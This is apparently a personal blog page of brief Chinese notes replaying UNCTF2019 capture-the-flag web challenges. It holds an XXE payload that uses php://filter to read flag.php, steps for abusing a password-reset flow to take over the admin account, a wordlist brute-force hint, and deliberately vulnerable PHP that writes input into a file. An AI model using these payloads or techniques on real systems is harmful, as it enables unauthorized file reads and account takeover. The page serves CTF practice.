---
layout: page
title: "UNCTF2019复现"
date: 2019-11-12 01:01
---

## 给赵总征婚
rockyou字典爆破

## NSB Reset Password
删除cookie账号不存在，说明通过cookie来判断用户是否存在
先注册新账号，找回密码，通过验证，在另一个页面找回admin密码，此时当前用户为admin，在切回通过验证页面重置密码

## Do you like xml?

```
<!DOCTYPE a[ <!ENTITY xxe SYSTEM
"php://filter/read=convert.base64-encode/resource=flag.php">]>
<user><username>&xxe;</username><password>admin</password></user>
```

## simple_web
根据提示访问./robots.txt；打开自己的沙箱，查看源码

```php
<?php
$str = addslashes($_GET['content']);
$file = file_get_contents('content.php');
$file = preg_replace('|\$content=\'.*\';|', "\$content='$str';", $file);
file_put_contents('content.php', $file);
highlight_file(__FILE__);
?>
```
`addslashes`在预定义字符 单引号双引号反斜杠NULL前加反斜杠